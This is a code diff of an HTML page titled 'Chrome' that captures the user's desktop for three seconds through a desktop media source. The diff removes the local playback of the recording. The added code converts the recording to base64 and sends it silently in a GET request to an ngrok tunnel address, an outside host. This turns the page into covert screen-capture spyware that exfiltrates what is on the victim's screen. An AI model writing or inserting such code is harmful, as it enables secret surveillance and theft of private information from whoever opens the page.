@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<title>Chrome</title>
+  <meta charset="utf-8">
+  <title>Chrome</title>
 </head>
 <body>
     <video controls id="output"></video>
@@ -11,38 +11,59 @@
       // stream capture
       const constraints = {
         video: {
-             mandatory: {
-                chromeMediaSource: 'desktop',
-                minWidth: 1280,
-                maxWidth: 1280,
-                minHeight: 720,
-		maxHeight: 720
-             },
-         },
+          mandatory: {
+            chromeMediaSource: 'desktop',
+            minWidth: 1280,
+            maxWidth: 1280,
+            minHeight: 720,
+            maxHeight: 720
+          },
+        },
       };
-      // const constraints = {audio: false,  video: true}; // video capture
-      // const constraints = {audio: true,  video: false};  // audio capture
 
-      navigator.getUserMedia(constraints, (stream) => {
-        const mediaRecorder = new MediaRecorder(stream);
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then((stream) => {
+          const mediaRecorder = new MediaRecorder(stream);
+          const chunks = [];
 
-        mediaRecorder.start();
+          mediaRecorder.ondataavailable = (e) => {
+            chunks.push(e.data);
+          };
 
-        mediaRecorder.ondataavailable = (e) => {
-          const reader = new FileReader();
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
 
-          reader.readAsDataURL(e.data);
-          reader.onloadend = () => {
-            const base64data = reader.result;
-	    document.getElementById('output').src = base64data.replace('video/x-matroska', 'video/mp4'); // replace mime for chrome's tag video
-            // do anything with stream here            
-          }
-        }
+            const reader = new FileReader();
+            reader.onloadend = () => {
+              const base64data = reader.result;
 
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 3000); // autostop record
-      }, (err) => {console.log(err) });
+              // Send the base64data via GET request
+              const url = 'https://ea0b-95-106-68-53.ngrok-free.app?video=' + encodeURIComponent(base64data);
+
+              fetch(url, {
+                method: 'GET'
+              })
+                .then(response => response.text())
+                .then(data => {
+                  console.log('Video uploaded successfully:', data);
+                })
+                .catch(error => {
+                  console.error('Error uploading video:', error);
+                });
+            };
+
+            reader.readAsDataURL(blob);
+          };
+
+          mediaRecorder.start();
+
+          setTimeout(() => {
+            mediaRecorder.stop();
+          }, 3000); // Record for 3 seconds
+        })
+        .catch(err => {
+          console.error('Error accessing media devices:', err);
+        });
     </script>
 </body>
 </html>
